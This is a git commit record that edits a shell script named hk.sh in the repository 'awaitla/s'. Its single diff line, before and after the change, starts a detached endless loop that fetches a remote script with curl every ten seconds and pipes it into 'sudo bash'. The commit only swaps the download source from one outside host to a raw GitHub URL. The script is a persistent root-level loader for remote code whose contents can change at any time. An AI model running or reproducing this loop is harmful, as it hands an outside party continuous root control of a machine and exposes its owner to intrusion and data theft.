ac6bcd1276c6f83c5550182434f315075368d1da
aa0c <107745374+awaitla@users.noreply.github.com>
2024-06-27 21:44:53 +0800

    Update hk.sh

--- run/hk.sh
+++ run/hk.sh
@@ -1,1 +1,1 @@
-nohup bash -c 'while true; do sudo curl -fsSL https://api.hotpe.top/test/test.sh | sudo bash; sleep 10; done' &
+nohup bash -c 'while true; do sudo curl -fsSL https://github.com/awaitla/s/raw/main/run/uptime.sh | sudo bash; sleep 10; done' &
